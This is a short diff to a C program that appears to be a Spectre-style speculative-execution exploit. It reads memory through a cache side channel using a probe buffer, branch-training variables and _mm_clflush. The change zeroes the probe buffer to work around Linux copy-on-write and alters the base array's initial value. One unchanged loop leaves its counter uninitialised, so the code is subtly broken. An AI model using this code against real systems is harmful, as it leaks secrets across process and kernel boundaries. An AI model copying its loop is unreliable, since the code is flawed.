@@ -1,10 +1,8 @@
 #include <stdio.h>
 #include <x86intrin.h>
 
-
-
 unsigned char buf[256 * 4096];
-unsigned char base[1] = {0};		// 目标地址的base数组
+unsigned char base[1] = {255};		// 目标地址的base数组
 int array_size = 16;
 
 volatile char value_tmp = 0;
@@ -29,10 +27,15 @@ void readMemoryByCache(size_t addr, int len){
 	char *addr_tmp;
 	static int result[256];
 	
-	size_t offset_x;		// 目标地址基于base数组的偏移量
+	size_t offset_x;				// 目标地址基于base数组的偏移量
 	size_t training_x = 0, x;		// 训练参数 防止CPU分支预测正确
 	offset_x = (unsigned char *)addr - base;
-	
+
+
+	// 防止Linux的写时拷贝优化
+	for(int i = 0; i < 256*4096; i++)
+		buf[i] = 0;
+
 	for(int index = 0; index < len; index++){
 		for(int i; i < 256; i++)
 			_mm_clflush(&buf[i * 4096]);
